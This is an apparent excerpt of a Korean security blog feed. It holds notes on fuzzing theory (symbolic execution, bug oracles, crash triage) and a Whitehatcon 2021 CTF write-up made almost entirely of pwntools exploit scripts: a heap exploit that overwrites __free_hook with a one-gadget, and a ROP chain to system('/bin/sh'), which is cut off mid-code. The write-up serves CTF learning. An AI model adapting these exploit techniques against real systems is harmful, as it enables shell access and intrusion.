Symbolic Execution</h3><ul><li>여러가지 방식이 있으나 일반적으로 basic block 단위로 움직인다.</li><li>branch를 만나면 상태 값을 저장하고, fork 시켜 경우의 수를 나누어 모든 경로를 탐색한다.</li><li>BFS, DFS 두가지 방식으로 path를 탐색할 수 있다.</li><li>fully symbolic 은 일반 바이너리에서 어렵다.</li><li>각각의 branch를 통과하기 위한 값을 찾기 위해 일반적으로 SMT solver를 사용한다.</li></ul><h3 id="5-3-2-Guided-Fuzzing"><a href="#5-3-2-Guided-Fuzzing" class="headerlink" title="5-3-2. Guided Fuzzing"></a>5-3-2. Guided Fuzzing</h3><ul><li>퍼징의 확률을 높이기 위해 특정 부분까지 직접 리버싱을 해서 해를 찾아가는 방법이다.</li><li>어느 정도 해를 찾아 퍼징을 할 포인트를 잡아주고 거기서부터 퍼징을 하는 방식이다.<ul><li>ex) TaintScope, Dowser</li></ul></li></ul><h3 id="5-3-3-PUT-Mutation"><a href="#5-3-3-PUT-Mutation" class="headerlink" title="5-3-3. PUT Mutation"></a>5-3-3. PUT Mutation</h3><ul><li>checksum 검사가 있는 경우 모든 데이터가 통과할 수 없기 때문에 바이너리 패치를 통하여 이러한 부분을 무조건 넘기도록 하고 퍼징을 진행한다.</li></ul><hr><h2 id="6-Input-Evaluation"><a href="#6-Input-Evaluation" class="headerlink" title="6. Input Evaluation"></a>6. Input Evaluation</h2><ul><li>퍼징을 수행후에 위반이 일어났는지 안났는지를 판단하기 위한 행위이다.</li><li>단순하게 처리하는 방법도 있지만, 최적화 방법론, 퍼징 효율 등을 고려할 수 있다.</li></ul><h3 id="6-1-Bug-oracle"><a href="#6-1-Bug-oracle" class="headerlink" title="6-1. Bug oracle"></a>6-1. Bug oracle</h3><ul><li>버그 오라클이란 해당 프로그램 수행이 버그를 내포하고 있는지 아닌지를 결정한다.</li><li>sanitizer는 unsafe하거나 unwanted한 프로그램의 동작이 보이는 즉시 강제로 abort를 발생시키는 기법이다.</li></ul><h3 id="6-1-1-Memory-and-Type-safety"><a href="#6-1-1-Memory-and-Type-safety" class="headerlink" title="6-1-1. Memory and Type safety"></a>6-1-1. Memory and Type safety</h3><ul><li>메모리의 유효한 바운더리를 두고 이 경계를 넘는지를 탐지하는 방식.</li><li>Spatial : 특정 객체가 의도하지 않은 대상의 외부에서 포인터 역참조가 발생할 때.<ul><li>Overflow</li></ul></li><li>Temporal : 더 이상 유효하지 않은 포인터에 접근하게 될 때.<ul><li>Use-after-free</li></ul></li></ul><h3 id="6-1-2-Undefined-behaviors"><a href="#6-1-2-Undefined-behaviors" class="headerlink" title="6-1-2. Undefined behaviors"></a>6-1-2. Undefined behaviors</h3><ul><li>컴파일러 최적화 설정, 아키텍처, 컴파일 버전으로 인하여 생기는 예상치 못한 행동.</li></ul><h3 id="6-1-3-Input-validation"><a href="#6-1-3-Input-validation" class="headerlink" title="6-1-3. Input validation"></a>6-1-3. Input validation</h3><ul><li>입력 값 확인.</li><li>XSS나 SQL injection과 같은 취약점들은 모두 주어진 입력 값에 대한 검증을 제대로 수행하지 않았을 때 발생한다.</li></ul><h3 id="6-1-4-Semantic-Difference-differential-testing"><a href="#6-1-4-Semantic-Difference-differential-testing" class="headerlink" title="6-1-4. Semantic Difference (differential testing)"></a>6-1-4. Semantic Difference (differential testing)</h3><ul><li>주어진 두 개 이상의 다른 INPUT으로 출력 간의 차이를 두어 비교 분석한다.</li></ul><h3 id="6-2-Execution-Optimizations"><a href="#6-2-Execution-Optimizations" class="headerlink" title="6-2. Execution Optimizations"></a>6-2. Execution Optimizations</h3><ul><li>반복적인 로딩 프로세스를 건너 뛸 수 있도록 구현하는 것.</li><li>PUT을 매번 프로세스 재 가동 시키게 하는 것은 굉장한 부하를 유발한다.</li></ul><h3 id="6-3-Triage"><a href="#6-3-Triage" class="headerlink" title="6-3. Triage"></a>6-3. Triage</h3><ul><li>보안 정책 위반을 촉발한 해당 테스트 케이스에 대하여 분석하고 리포트하는 작업<br>이다.</li><li>결과의 중복 제거, 우선순위 지정, 테스트 케이스 최소화 작업을 진행한다.</li></ul><h3 id="6-3-1-Deduplication"><a href="#6-3-1-Deduplication" class="headerlink" title="6-3-1. Deduplication"></a>6-3-1. Deduplication</h3><ul><li>동일한 버그를 유발하는 다수의 테스트 케이스를 식별하여 이를 제거하는 것이다.</li><li>각각의 unique bug만을 촉발하는 고유한 test case의 집합만을 남겨두는 것이다.</li><li>분석 시간을 절약 할 수 있으며, 컴퓨터 리소스를 절약 할 수 있다.</li><li>Stack Backtrace hashing : 가장 고전적인 방식으로 backtrace를 통하여 stack 호출 순서를 hasing하여 비교하는 방식, 힙메모리 커럽션에 대한 유니크 크래시를 구분할 수가 없다.</li><li>Coverage-based Deduplication : 크래시가 났을때 동일한 코드에서 터졌는지 확인 하는 방법. (Ex. AFL)</li><li>Semantics-aware Deduplication : core dump의 내용을 분석하고, 어떤 instruction이 bad value를 할당하였는지를 찾아내는 것이다.</li></ul><h3 id="6-3-2-Prioritization-and-Exploitability"><a href="#6-3-2-Prioritization-and-Exploitability" class="headerlink" title="6-3-2. Prioritization and Exploitability"></a>6-3-2. Prioritization and Exploitability</h3><ul><li>unique 한지 보는 것이 아니라 취약점이 악용될 수 있는 지를 판단한다. (Ex. !Exploitable)</li><li>EXPLOITABLE&gt; PROBABLY_EXPLOITABLE&gt; UNKNOWN&gt; NOT_LIKELY_EXPLOITABLE</li><li>결과가 정확하지 않다는 단점이 크다.</li></ul><h3 id="6-3-3-Test-case-minimization"><a href="#6-3-3-Test-case-minimization" class="headerlink" title="6-3-3. Test case minimization"></a>6-3-3. Test case minimization</h3><ul><li>테스트 케이스 중 실제로 보안정책을 위반하게 되는 직접적인 원인 만을 남겨둔 채 기타 부가적인 요소들은 최소화하는 것이다.</li><li>seed trimming과 유사한 개념으로, 입력 값의 사이즈를 줄이려는 시도이다. 테스트 케이스를 최소화 시킴으로써 버그 오라클의 성능을 향상 시킬 수 있다.</li></ul><hr><h2 id="7-Configuration-Update"><a href="#7-Configuration-Update" class="headerlink" title="7. Configuration Update"></a>7. Configuration Update</h2><ul><li>ConfUpdate 단계는 블랙박스 테스팅을 다른 화이트, 그레이 박스 테스팅과 구분 짓는 가장<br>중요한 지표이다.</li><li>블랙박스 퍼저의 경우 프로그램으로부터 어떠한 버그가 발생했는지, 버그 발생에 따라 어떠한 introspection 정보를 얻을 수가 없기 때문에 configuration을 딱히 수정할 수가 없다.</li><li>그레이 박스나 화이트 박스 퍼저들은 보다 정확하게 confupdate를 하도록 구현되어 있다.</li></ul><h3 id="7-1-Evolutionary-Seed-Pool-Update"><a href="#7-1-Evolutionary-Seed-Pool-Update" class="headerlink" title="7-1. Evolutionary Seed Pool Update"></a>7-1. Evolutionary Seed Pool Update</h3><ul><li>Evolutionary Algorithm(EA)는 생물학적 진화 이론에 등장하는 돌연변이, 재조합, 선택설 등의 휴리스틱 기반의 접근법이다.</li><li>퍼징의 맥락에서는 적절한 seed pool을 구성하기 위해 EA를 적용한다.</li><li>대부분 ConfUPdate 단계에서 새로운 conf를 설정 할 때, 노드 혹은 브랜치 coverage를 계산하여 특정 테스트케이스에 의해 새로운 노드나 브랜치가 발견되는지를 찾는 방법을 사용한다.</li></ul><h3 id="7-2-Maintaining-a-Minset"><a href="#7-2-Maintaining-a-Minset" class="headerlink" title="7-2. Maintaining a Minset"></a>7-2. Maintaining a Minset</h3><ul><li>coverage를 최대치로 만족 시키는 test case의 최소 집합만을 구하는 것이다.</li><li>config가 지나치게 많아지는 것을 방지하기 위함이다.</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>Manes, Valentin JM, et al. “Fuzzing: Art, science, and engineering.” arXiv preprint arXiv:1812.00140 (2018).</li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/25/2021-10-26-FuzzingART/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>What The Fuzz! (WTF)</title>
      <link>https://pwnkidhn.github.io/2021/10/20/2021-10-21-WTF/</link>
      <guid>https://pwnkidhn.github.io/2021/10/20/2021-10-21-WTF/</guid>
      <pubDate>Wed, 20 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;What the fuzz 간단 정리 &lt;/center&gt;

&lt;h2 id=&quot;What-is-Fuzzing&quot;&gt;&lt;a href=&quot;#What-is-Fuzzing&quot; class=&quot;headerlink&quot; title=&quot;What is Fuzzing?&quot;&gt;&lt;/a&gt;What is Fuzzing?&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Fuzzing or fuzz testing은 프로그램 내 잠재적 취약점을 찾는데 사용되는 자동화된 SW 기술.&lt;/li&gt;
&lt;li&gt;Input이 있는 모든 SW는 Fuzzed 될 수 있음.&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>What the fuzz 간단 정리 </center><h2 id="What-is-Fuzzing"><a href="#What-is-Fuzzing" class="headerlink" title="What is Fuzzing?"></a>What is Fuzzing?</h2><ul><li>Fuzzing or fuzz testing은 프로그램 내 잠재적 취약점을 찾는데 사용되는 자동화된 SW 기술.</li><li>Input이 있는 모든 SW는 Fuzzed 될 수 있음.</li></ul><span id="more"></span><h2 id="Why-Fuzzing"><a href="#Why-Fuzzing" class="headerlink" title="Why Fuzzing?"></a>Why Fuzzing?</h2><ul><li>Manual Testing시 tester의 역량에 따라 결과가 달라짐.</li><li>사람이 못하는 취약점을 찾을 수 있다.</li><li>Application이 복잡할 수록 attack surface가 많아지지만, 사람이 테스트 하기에 어려움.</li><li>이미 알려진 취약점이 다시 나오지 않도록 Regression testing 하는 데 사용.</li></ul><h2 id="Common-issues-with-fuzzing"><a href="#Common-issues-with-fuzzing" class="headerlink" title="Common issues with fuzzing"></a>Common issues with fuzzing</h2><ul><li>원하는 종류의 취약점을 발견하는데 까지 시간이 오래 걸릴 수 있다.</li><li>Smart Fuzzer(Input 구조를 알고 있는)를 사용하는데 몇 가지 작업이 좀 필요하다.</li><li>아무리 좋은 Fuzzer도 모든 취약점을 발견할 수 없다.</li><li>Fuzzing 결과에 취약점이 없다 해도 그 프로그램은 100% 안전한 게 아니다.</li><li>발견된 취약점은 검증이 반드시 필요하다.</li></ul><h2 id="What-in-needed-for-fuzzing"><a href="#What-in-needed-for-fuzzing" class="headerlink" title="What in needed for fuzzing?"></a>What in needed for fuzzing?</h2><ul><li>Input이 있는 Fuzzing 대상</li><li>찾고 싶은 취약점 종류</li><li>사용할 Fuzzer</li></ul><h2 id="What-types-of-bug-can-a-fuzzer-find"><a href="#What-types-of-bug-can-a-fuzzer-find" class="headerlink" title="What types of bug can a fuzzer find?"></a>What types of bug can a fuzzer find?</h2><ul><li>이론 상 모든 종류의 취약점을 찾을 수 있음</li><li>Logical Bug 보다 Memory Corruption 종류가 찾기 더 쉬움</li></ul><h2 id="Architecture-of-a-typical-fuzzer"><a href="#Architecture-of-a-typical-fuzzer" class="headerlink" title="Architecture of a typical fuzzer"></a>Architecture of a typical fuzzer</h2><ul><li>전형적인 Fuzzer의 3가지 구조.</li><li>Test Case Generator - Worker에서 사용할 input을 생성</li><li>Logger - bug분석에 필요한 모든 것을 기록 (input, 결과)</li><li>Worker - input을 가지고 fuzzing 실행, 버그 탐지</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/138283140-7d929031-0f20-42ea-bce0-9d7efb2fe0f5.png" alt="fuzzer-architecture"></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://labs.f-secure.com/blog/what-the-fuzz/">https://labs.f-secure.com/blog/what-the-fuzz/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/20/2021-10-21-WTF/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021 Whitehatcon CTF</title>
      <link>https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/</link>
      <guid>https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/</guid>
      <pubDate>Wed, 20 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2021 Whitehatcontest CTF Write-up &lt;/center&gt;

&lt;p&gt;I’m very happy that our team came in 24th in this CTF and i solve 3 problems. I write about it a month after the CTF. Actually i forgot how to solve them. that’s why i need to check binary files again. but i lost binary files, could only find payload. So this post has only payload.TT&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2021 Whitehatcontest CTF Write-up </center><p>I’m very happy that our team came in 24th in this CTF and i solve 3 problems. I write about it a month after the CTF. Actually i forgot how to solve them. that’s why i need to check binary files again. but i lost binary files, could only find payload. So this post has only payload.TT</p><span id="more"></span><h2 id="chunk-manager"><a href="#chunk-manager" class="headerlink" title="chunk_manager"></a>chunk_manager</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocMem</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMem</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillMem</span>(<span class="params">idx,offset,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;in:\n&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">freeMem</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">allocMem(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">1</span>,<span class="number">0x409</span>)</span><br><span class="line">allocMem(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">41</span>,<span class="number">8</span>):</span><br><span class="line">    fillMem(<span class="number">0</span>,i,<span class="string">&#x27;PPPPPPPP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printMem(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">7</span>:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="string">&quot;leak: &quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">log.info(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">oneshot = <span class="number">0x10a41c</span> + libcbase</span><br><span class="line">oneshot = <span class="number">0x4f432</span> + libcbase</span><br><span class="line"><span class="comment">#oneshot = 0x4f3d5 + libcbase</span></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap</span></span><br><span class="line">allocMem(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">4</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">5</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">4</span>)</span><br><span class="line">freeMem(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,<span class="string">&#x27;AAAAAAAC&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">printMem(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">leak = u64(leak+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak)))</span><br><span class="line">log.info(<span class="string">&quot;heap: &quot;</span> +<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">heapbase = leak - <span class="number">0xc0</span> + <span class="number">0x50</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#overwrite topchunk</span></span><br><span class="line"><span class="comment">#topchunk = leak + 0x410</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="comment">#log.info(&quot;top_chunk: &quot; + hex(topchunk))</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fillMem(2,40,p64(0xffffffffffffffff))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">size = (free_hook - 0x20 - 0x10 - topchunk)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">allocMem(9,str(size))</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">allocMem(4,0x200)</span></span><br><span class="line"><span class="string">fillMem(4,0,&#x27;AAAAAAAAA&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">printMem(1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">fillMem(<span class="number">0</span>,(free_hook-heapbase-<span class="number">0x10</span>),p64(oneshot))</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="string-manger"><a href="#string-manger" class="headerlink" title="string manger"></a>string manger</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./binary&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copyString</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;copy size ? &#x27;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyString</span>(<span class="params">data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content : &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmpString</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;compare size ? &#x27;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">oneshot</span>):</span></span><br><span class="line">    oneshot = pack(<span class="string">&#x27;&gt;q&#x27;</span>,oneshot)</span><br><span class="line">    oneshot = oneshot[<span class="number">2</span>:]</span><br><span class="line">    oneshot = u64(<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(oneshot)) + oneshot)</span><br><span class="line">    <span class="keyword">return</span> oneshot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span></span><br><span class="line"></span><br><span class="line">modifyString(payload)</span><br><span class="line">pause()</span><br><span class="line">copyString(<span class="built_in">str</span>(<span class="number">55</span>))</span><br><span class="line">pause()</span><br><span class="line">cmpString(<span class="built_in">str</span>(<span class="number">55</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;string1 : &#x27;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&#x27; a&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>]</span><br><span class="line">leak = u64(leak+ <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libcleak = pack(<span class="string">&#x27;&gt;q&#x27;</span>,leak)</span><br><span class="line">libcleak = libcleak[<span class="number">2</span>:]</span><br><span class="line">libcleak = u64(libcleak + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(libcleak)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(libcleak))</span><br><span class="line"></span><br><span class="line">libcbase = libcleak - <span class="number">0x3fc39f</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libcbase : &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">oneshot = libcbase + <span class="number">0x10a41c</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f432</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"><span class="comment">#overwrite ret</span></span><br><span class="line">ret = libcbase + <span class="number">0x001d84d3</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">prdi = libcbase + <span class="number">0x0016609c</span></span><br><span class="line"></span><br><span class="line">system = convert(system)</span><br><span class="line">binsh = convert(binsh)</span><br><span class="line">prdi = convert(prdi)</span><br><span class="line">ret = convert(ret)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">oneshot = pack(&#x27;&gt;q&#x27;,oneshot)</span></span><br><span class="line"><span class="string">oneshot = oneshot[2:]</span></span><br><span class="line"><span class="string">oneshot = u64(b&#x27;\x00&#x27;*(8-len(oneshot)) + oneshot)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print (hex(oneshot))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;BBBB&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span>*<span class="number">13</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += <span class="string">b&#x27;E&#x27;</span></span><br><span class="line"></span><br><span class="line">modifyString(payload)</span><br><span class="line">copyString(<span class="built_in">str</span>(<span 